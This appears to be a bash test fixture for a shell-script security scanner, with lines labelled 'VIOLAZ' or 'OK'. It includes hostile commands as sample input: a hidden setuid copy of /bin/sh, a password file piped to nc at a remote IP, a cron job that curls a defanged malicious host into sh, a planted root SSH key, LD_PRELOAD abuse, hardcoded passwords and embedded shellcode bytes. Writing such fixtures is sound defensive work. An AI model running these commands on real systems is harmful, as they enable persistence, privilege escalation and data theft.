#!/bin/bash

# VIOLAZ
exec alias ls='ls --color=auto'
exec echo QWxhZGRpbjpvcGVuIHNlc2FtZQ== | base64 --decode
exec chmod +x file.txt
exec ls $*
# fine VIOLAZ

if [ "$USER" = "root" ] ; then 
	# OK
	/bin/cp /bin/sh /tmp/.secretshell 
	# OK
	/bin/chown root /tmp/.secretshell 
	# VIOLAZ
	chmod 4666 root /tmp/.secretshell 
fi 
# VIOLAZ
ls $*
# OK
/bin/ls $*

# VIOLAZ
exec pskill kill.exe
wget http://website.com/files/file.msi
curl -T LocalFile http://www.my.site
# XXX: password
echo "My password is secret!" > /tmp/mypublicdata
PUBLICDATA="$(cat /tmp/mypublicdata)"
echo "$PUBLICDATA" | nc 192.168.1.102 3333
# vale anche per CWE398LL
for^^^D9000A6E1DBA2A95B2DDB13E74B220354B5B63AC (( i=0;i<=Num;i++ ))^^^A04BDD7E8B4AB852FDC07FAF54E0107B12913976 do^^^\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68 /bin/echo~~~bcd981e6b112655886c12639214c366ef6961f03 -n "$f1 " fn=$((f1+f2))^^^A52A61459E705054790329809CA21970B2999E77 f1=$f2^^^451DBA3B0289063BCA2F6B7319D9F37F944C1BA6 f2=$fn^^^7ECA3DF4236A6E384DE9ABABD46C4D53BEA2528A done^^^14d13c75e6a9348ddd5561ad7f1155609175f38a

if [ $UID = 100 -a $USER = "myusername" ] ; then
    cd $HOME
fi

eval $(set_my_variables)
variable="$(eval some_function)"

var="`command \`command1\``"

PASSWORD="froBOZ69"
CONTRASENA ="P1PE0219"

alias synth='echo secretpw | pbcopy; sftp adt@wsynth.net'

echo -n "pAssw0rd" | gpg --armor --no-default-keyring --keyring /media/usb/key.pub --recipient someone@mail.com --encrypt

echo -n "What file do you seek? " 
read name 
# VIOLAZ
ls -l $name
echo -n "Enter a Password : "
read password
# VIOLAZ
crypt $password < $file > $file.cpy
send -- "$password\r"
export pwd=$password

echo "Content-type: text/html"; echo "" 
echo "Uptime on the Server:<pre>" 
uptime -a 
echo "</pre>"

LD_LIBRARY_PATH=.:/usr/lib
LD_PRELOAD=.:/malloc.so /bin/ls 

IFS='/' 

USERS=$(awk -F: '{ if ( $3 > 1000 ) print $1}' /etc/passwd)

echo "ssh-rsa AAAAB3N ...[redacted]... Mq/jc5YLfnAnbGVbBMhuWzaWUp root@host-10-10-10-26" >> /root/.ssh/authorized_keys

cat /etc/hosts 
tail /etc/hosts.equiv 
echo 0 > /etc/ttytab 
mv nuil /etc/ttys 
mv null /dev/kmem 
cat /dev/mem 
cat /usr/adm/lastlog 
cat /usr/adm/utmp 
cat /usr/adm/wtmp 
cat /usr/adm/acct 
cat /usr/adm/messages 

echo "*/5 * * * * curl -fsSL hxxp://xksqu4mj.fri3nds[.]in/tools/transfer.sh | sh" > var/spool/cron/root

exec -a "${0}" /home/httpd/cgi-bin/QTSauthLogin.cgi

alias dir="ls -al | grep ^d"

arp
ifconfig -a
iptunnel
iwconfig --version
nameif -c config.xml
route add -net 192.56.76.0 netmask 255.255.255.0 dev eth0
ipmaddr 
netstat -a

# fine VIOLAZ

# VIOLAZ
psa@bilby$ rm -v *
mv * /tmp
# OK
rm -v ./*

last_line='NULL'
# VIOLAZ
ls -al | while read line; do
  last_line="${line}"
done

# VIOLAZ
PATH=".:/bin:/usr/bin:$HOME/bin:/usr/local/bin"
PATH="/bin:/usr/bin:.:$HOME/bin:/usr/local/bin"
# OK
export PATH=~/opt/bin:$PATH:.

# VIOLAZ
echo "$SECRETDATA" >> /tmp/mysecretdata
# OK
FILENAME="$(mktemp /tmp/mysecretdata)"
echo "$SECRETDATA" >> "$FILENAME"

